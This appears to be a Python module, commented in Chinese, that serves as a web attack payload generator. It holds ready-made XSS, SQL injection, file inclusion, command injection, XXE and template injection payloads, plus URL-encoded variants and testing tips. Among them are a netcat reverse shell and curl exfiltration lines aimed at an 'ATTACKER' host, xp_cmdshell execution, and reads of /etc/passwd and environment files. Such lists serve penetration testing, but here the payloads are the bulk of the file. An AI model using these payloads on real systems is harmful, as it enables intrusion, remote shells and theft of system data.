"""
AI Payload Generator — 安全载荷生成引擎

生成 XSS / SQLi / LFI / RCE / XXE / SSTI 六类载荷,
带上下文增强、URL 编码变体和风险评估
"""

import logging
from typing import Dict, List, Any
from urllib.parse import quote

logger = logging.getLogger(__name__)

_TEMPLATES: Dict[str, Dict[str, List[str]]] = {
    "xss": {
        "basic": [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
        ],
        "advanced": [
            "';alert(String.fromCharCode(88,83,83))//",
            "\"><script>alert('XSS')</script><!--",
            "<details ontoggle=alert('XSS')>",
            "<body onload=alert('XSS')>",
        ],
        "bypass": [
            "<ScRiPt>alert('XSS')</ScRiPt>",
            "<svg/onload=alert('XSS')>",
            "javascript:alert('XSS')",
        ],
    },
    "sqli": {
        "basic": ["' OR '1'='1", "' OR 1=1--", "admin'--"],
        "advanced": [
            "' UNION SELECT 1,2,3,4,5--",
            "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
            "'; EXEC xp_cmdshell('whoami')--",
        ],
        "time_based": [
            "'; WAITFOR DELAY '00:00:05'--",
            "' OR (SELECT SLEEP(5))--",
            "'; SELECT pg_sleep(5)--",
        ],
    },
    "lfi": {
        "basic": ["../../../etc/passwd", "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts"],
        "advanced": [
            "....//....//....//etc/passwd",
            "..%2F..%2F..%2Fetc%2Fpasswd",
            "/proc/self/environ",
            "php://filter/convert.base64-encode/resource=index.php",
        ],
    },
    "rce": {
        "basic": ["; whoami", "| id", "&& cat /etc/passwd", "`id`"],
        "advanced": [
            "| nc -e /bin/bash ATTACKER 4444",
            "&& curl http://ATTACKER/$(whoami)",
            "$(curl http://ATTACKER/$(id))",
        ],
    },
    "xxe": {
        "basic": [
            '<?xml version="1.0"?><!DOCTYPE r[<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>',
        ],
    },
    "ssti": {
        "basic": ["{{7*7}}", "${7*7}", "#{7*7}", "<%=7*7%>"],
        "advanced": [
            "{{config}}",
            "{{''.__class__.__mro__[2].__subclasses__()}}",
        ],
    },
}

_HIGH_RISK = ["system", "exec", "eval", "cmd", "shell", "passwd"]
_MED_RISK = ["script", "alert", "union", "select"]


class AIPayloadGenerator:
    """上下文感知的安全载荷生成器"""

    def generate(self, attack_type: str = "xss", complexity: str = "basic", technology: str = "") -> Dict[str, Any]:
        raw = _TEMPLATES.get(attack_type, {}).get(complexity, _TEMPLATES.get(attack_type, {}).get("basic", []))

        enhanced: List[Dict[str, Any]] = []
        for p in raw:
            enhanced.append(self._enrich(p, "none"))
            enhanced.append(self._enrich(quote(p), "url"))

        return {
            "attack_type": attack_type,
            "complexity": complexity,
            "payload_count": len(enhanced),
            "payloads": enhanced,
            "test_cases": [
                {"id": f"tc_{i+1}", "payload": e["payload"], "risk": e["risk_level"]}
                for i, e in enumerate(enhanced[:10])
            ],
            "recommendations": self._tips(attack_type),
        }

    @staticmethod
    def _enrich(payload: str, encoding: str) -> Dict[str, Any]:
        pl = payload.lower()
        if any(k in pl for k in _HIGH_RISK):
            risk = "HIGH"
        elif any(k in pl for k in _MED_RISK):
            risk = "MEDIUM"
        else:
            risk = "LOW"
        return {"payload": payload, "encoding": encoding, "risk_level": risk}

    @staticmethod
    def _tips(atype: str) -> List[str]:
        return {
            "xss": ["在不同输入字段中测试", "尝试存储型和反射型", "使用浏览器 DevTools 验证"],
            "sqli": ["分别测试 Error-based / Blind / Time-based", "尝试不同数据库方言"],
            "lfi": ["逐步增加遍历深度", "尝试 URL 编码绕过", "检查日志文件包含"],
            "rce": ["尝试不同命令分隔符", "测试 blind 和 direct 注入"],
            "xxe": ["测试 file:// 和 http:// 协议", "尝试参数实体"],
            "ssti": ["识别模板引擎", "测试 {{7*7}} 等表达式"],
        }.get(atype, ["全面测试", "监控响应变化"])


payload_generator = AIPayloadGenerator()
